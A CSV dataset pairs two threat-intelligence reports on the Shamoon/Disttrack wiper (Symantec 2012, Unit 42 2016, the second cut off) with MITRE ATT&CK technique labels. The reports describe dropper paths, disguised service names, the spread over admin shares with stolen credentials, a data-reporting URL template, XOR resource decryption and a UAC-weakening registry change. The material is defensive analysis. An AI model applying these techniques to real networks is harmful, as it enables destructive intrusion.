url,mitre_domain,tactic_name,tech_name,tech_id,text,software_id
https://www.symantec.com/connect/blogs/shamoon-attacks,['enterprise-attack'],['impact'],"['Disk Structure Wipe', 'Data Destruction', 'Disk Structure Wipe']","['T1487', 'T1485', 'T1561.002', 'T1058', 'T1574.011', 'T1031']","
Endpoint Protection - Symantec Enterprise
Products
Applications
Support
Company
How To Buy
Skip to main content (Press Enter).
Sign in
Skip auxiliary navigation (Press Enter).
Register
Skip main navigation (Press Enter).
Toggle navigation
Search Options
HomeMy CommunitiesCommunities All CommunitiesEnterprise SoftwareMainframe SoftwareSymantec EnterpriseBlogs All BlogsEnterprise SoftwareMainframe SoftwareSymantec EnterpriseEvents All EventsEnterprise SoftwareMainframe SoftwareSymantec EnterpriseWater CoolerGroups Enterprise SoftwareMainframe SoftwareSymantec EnterpriseMembers
Endpoint Protection
Â View Only
Community Home
Threads
Library
Events
Members
Back to Library
The Shamoon Attacks
1
Recommend
Aug 16, 2012 11:37 AM
A L Johnson
W32.Disttrack is a new threat that is being used in specific targeted attacks against at least one organization in the energy sector.
It is a destructive malware that corrupts files on a compromised computer and overwrites the MBR (Master Boot Record) in an effort to render a computer unusable.
W32.Disttrack consists of several components:
Dropper—the main component and source of the original infection. It drops a number of other modules.
Wiper—this module is responsible for the destructive functionality of the threat.
Reporter—this module is responsible for reporting infection information back to the attacker.
Dropper Component
The Dropper component performs the following actions:
Copies itself to %System%\trksvr.exe
Drops the following files embedded into resources:
A 64-bit version of the dropper component: %System%\trksrv.exe (contained in the “X509” resource)
Reporter component: %System%\netinit.exe (contained in the ""PKCS7"" resource)
Wiper component: %System%\[NAME SELECTED FROM LIST].exe (contained in the ""PKCS12"" resource)
Note: The name of the component is selected from the following list:
caclsrv
certutl
clean
ctrl
dfrag
dnslookup
dvdquery
event
extract
findfile
fsutl
gpget
iissrv
ipsecure
msinit
ntx
ntdsutl
ntfrsutil
ntnw
power
rdsadmin
regsys
routeman
rrasrv
sacses
sfmsc
sigver
smbinit
wcscript
Copies itself to the following network shares:
ADMIN$
C$\\WINDOWS
D$\\WINDOWS
E$\\WINDOWS
Creates a task to execute itself
Creates the following service to start itself whenever Windows starts:
Service name: TrkSvr
Display name: Distributed Link Tracking Server
Image path: %System%\trksvr.exe
Wiper Component
The Wiper component includes the following functionality:
Deletes an existing driver from the following location and overwrites it with another legitimate driver:
%System%\drivers\drdisk.sys
The device driver is a clean disk driver that enables user-mode applications to read and write to disk sectors. The driver is used to overwrite the computer’s MBR but may be used for legitimate purposes.
The file is digitally signed
Executes the following commands that collect file names, which will be overwritten and writes them to f1.inf and f2.inf:
Files from the f1.inf and f2.inf will be overwritten with the JPEG image shown below. Overwritten files are thus rendered useless.
Figure 1. Image used to overwrite files
Finally, the component will overwrite the MBR so that the compromised computer can no longer start
The following string that points to the location of debug symbols was left in the Wiper component of this threat and gives an idea of where the component was located on the developer’s computer:
C:\Shamoon\ArabianGulf\wiper\release\wiper.pdb
Reporter Component
The Reporter component is responsible for sending infection information back to the attacker. Information is sent as a HTTP GET request and is structured as follows:
http://[DOMAIN]/ajax_modal/modal/data.asp?mydata=[MYDATA]&uid=[UID]&state=[STATE]
The following data is sent to the attacker:
[DOMAIN]—a domain name
[MYDATA]—a number that specifies how many files were overwritten
[UID]—the IP address of the compromised computer
[STATE]—a random number
Threats with such destructive payloads are unusual and are not typical of targeted attacks. Symantec Security Response is continuing to analyze this threat and will post more information as it becomes available. Symantec customers are protected from this threat, which our security products detect as W32.Disttrack.
Statistics
0
Favorited
0
Views
0
Files
0
Shares
0
Downloads
Tags and Keywords
Related Entries and Links
No Related Resource entered.
Products
Applications
Support
Company
How To Buy
Copyright Â© 2005-2022 Broadcom. All Rights Reserved. The term ""Broadcom"" refers to Broadcom Inc. and/or its subsidiaries. Hosted by Higher Logic, LLC on the behalf of Broadcom - Privacy Policy | Cookie Policy | Supply Chain Transparency
Terms of Use
Copyright 2019. All rights reserved.
Powered by Higher Logic
",[]
http://researchcenter.paloaltonetworks.com/2016/11/unit42-shamoon-2-return-disttrack-wiper/,['enterprise-attack'],"['impact', 'defense-evasion']","['Disk Structure Wipe', 'Masquerade Task or Service', 'Data Destruction', 'Disk Structure Wipe']","['T1487', 'T1036.004', 'T1485', 'T1561.002']","
Shamoon 2: Return of the Disttrack Wiper
Protect Against Russia-Ukraine Cyber Activity
Menu
Tools
ATOMs
Security Consulting
About Us
Under Attack?
Shamoon 2: Return of the Disttrack Wiper
75,737
people reacted
1
9
min. read
Share
By Robert Falcone
November 30, 2016 at 5:20 PM
Category: Unit 42
Tags: Disttrack Wiper, EMEA, Saudi Arabia, Shamoon 2, threat intelligence
This post is also available in:
日本語 (Japanese)In August 2012, an attack campaign known as Shamoon targeted a Saudi Arabian energy company to deliver a malware called Disttrack. Disttrack is a multipurpose tool that exhibits worm-like behavior by attempting to spread to other systems on a local network using stolen administrator credentials. More importantly, its claim to fame is the ability to destroy data and to render infected systems unusable. The attack four years ago resulted in 30,000 or more systems being damaged.
Last week, Unit 42 came across new Disttrack samples that appear to have been used in an updated attack campaign. The attack targeted at least one organization in Saudi Arabia, which aligns with the targeting of the initial Shamoon attacks. It appears the purpose of the new Disttrack samples were solely focused on destruction, as the samples were configured with a non-operational C2 server to report to and were set to begin wiping data exactly on 2016/11/17 20:45. In another similarity to Shamoon, this is the end of the work week in Saudi Arabia (their work week is from Sunday to Thursdays), so the malware had potentially the entire weekend to spread.
The 2012 Shamoon attacks took place on Lailat al Qadr, the holiest night of the year for Muslims; another time the attackers could be reasonably certain employees would not be at work.
Composition of Disttrack
Disttrack is comprised of three distinct parts: the dropper, communications and wiper components. The main Disttrack executable is a dropper that extracts additional tools from embedded resources and coordinates when to save and execute them. Embedded within each Disttrack sample is a component responsible for communicating with a C2 server and a separate component used to carry out the wiping functionality.
The dropper extracts the communications and wiper components from resources named ""PKCS7"" and ""PKCS12"" respectively, while the x86 sample extracts the x64 variant of Disttrack from a resource named “X509”. To extract the components, the dropper is configured to seek specific offsets within the resource, read a specified number of bytes and decrypt the contents using a specified key. The key exists in the sample as a base64 encoded string that the dropper will decode then use each byte of the resulting string to XOR the data obtained from the resource. When determining the location of the ciphertext within the resource, the dropper subtracts 14 from the offset value in the sample's configuration as an additional layer of obfuscation. Table 1 shows the resources within the Disttrack x86 sample, the component it contains and the values needed to decrypt its contents.
Component
Resource Name
Offset
Size
Base64 key
x64 Variant
X509
812 -14 = 798
717312
5tGLQqku0m02...
Communications
PKCS7
879 -14 = 865
159744
UPi0IzQOAyiL...
Wiper
PKCS12
792 -14 = 778
282112
3Lmqr/nJgzFZ7...
Table 1 Resources containing Disttrack components
Disttrack Functionality
Disttrack is mainly focused on data destruction and attempting to damage as many systems as possible. To do so, this malware attempts to spread to other systems on network using what are likely stolen administrator credentials. This is again similar to the 2012 Shamoon attacks, where compromised but legitimate credentials obtained in advance of the attacks were also hard coded into the malware to aid in its propagation. Disttrack also has the ability to download and execute additional applications to the system, as well as remotely set the date to start wiping systems.
Local Network Spreading
The Disttrack malware spreads to other systems automatically using stolen credentials. The Disttrack we analyzed contained the internal domain names and administrator credentials associated with the targeted organization. The internal domain and credentials appear to be stolen prior to the creation of this tool, as it is not a public domain and the credentials are not weak enough to have obtained through guessing, brute force or dictionary attacks.
Disttrack uses the internal domain names and credentials to log into remote systems on the same network segment. The malware determines the local network segment associated with the target system (call to gethostname) by obtaining the IP address for the system (call to gethostbyname). It then uses the system's IP addresses to enumerate the /24 network (x.x.x.0-255) that the system is networked with, and will attempt to spread to each of these remote systems.
The dropper then attempts to open the service manager on each remote system to start the RemoteRegistry service, which it will connect to using RegConnectRegistryW. Once connected, the dropper attempts to disable UAC (User Access Control) remote restrictions by setting the following registry key to a value of ""1"":
SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy
